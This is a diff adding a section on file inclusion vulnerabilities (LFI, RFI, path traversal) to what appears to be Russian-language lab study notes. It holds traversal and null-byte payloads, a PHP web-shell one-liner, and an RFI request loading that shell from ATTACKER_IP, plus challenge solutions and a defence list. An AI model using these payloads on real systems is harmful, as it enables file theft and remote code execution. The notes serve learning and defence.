@@ -1436,3 +1436,56 @@ curl -H "Cookie: logged_in=true; admin=true" http://TARGET/cookie-test
 Rate limiting, MFA, блокировка аккаунтов.
 Чтение параметров из одного источника ($_GET/$_POST, не $_REQUEST).
 Подпись cookie (HMAC, JWT) или хранение состояния на сервере.
+
+### File Inclusion (LFI / RFI / Path Traversal)
+Суть
+Уязвимость, при которой пользовательский ввод попадает в функцию работы с файлами (`include`, `require`, `file_get_contents`) без проверки. Позволяет читать произвольные файлы или выполнять код.
+Path Traversal
+- Чтение файлов за пределами веб-корня.
+- Payload: `../../../../etc/passwd`
+- Для Windows: `../../../../windows/win.ini`
+
+LFI (Local File Inclusion)
+- Включает локальные файлы через `include()`.
+- Если файл содержит PHP-код — он выполнится.
+- Обход префиксов и расширений:
+  - `../` ×N для выхода из папки.
+  - `%00` для обрезки `.php` (PHP < 5.3.4).
+  - `....//` для обхода фильтра, удаляющего `../`.
+  - `languages/../../../../etc/passwd` для обхода обязательного префикса.
+
+RFI (Remote File Inclusion)
+- Включает файлы с внешних URL.
+- Требует `allow_url_fopen = On` и `allow_url_include = On`.
+- Позволяет RCE.
+
+Практика: RFI на Playground
+1. На AttackBox: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+2. `python3 -m http.server 8000`
+3. `ifconfig | grep inet` — узнать IP
+4. Запрос: `?file=http://ATTACKER_IP:8000/shell.php&cmd=hostname`
+5. Результат: вывод команды `hostname`
+
+Challenge-2: LFI через cookie
+- Источник: cookie `THM`.
+- Код: `include("includes/" . $_COOKIE['THM'] . ".php")`.
+- Payload: `THM=../../../../etc/flag2%00`.
+- Ключ: 4 уровня `../` + нулевой байт.
+
+Challenge-3: обход фильтра через POST
+- Код: `include($_REQUEST['file'] . '.php')`.
+- Фильтр только на GET.
+- Payload (POST): `file=../../../etc/flag3%00`.
+- Ключ: `$_REQUEST` принимает POST/COOKIE, фильтр их не видит.
+
+Playground: RFI
+- Код: `include($_GET['file'])`.
+- Payload: `?file=http://ATTACKER_IP:8000/shell.php&cmd=hostname`.
+- Ключ: `allow_url_include = On`, никаких фильтров.
+
+Защита
+- Whitelist файлов.
+- Отключить `allow_url_fopen` и `allow_url_include`.
+- `display_errors = Off` в production.
+- Обновлять PHP.
+- WAF.
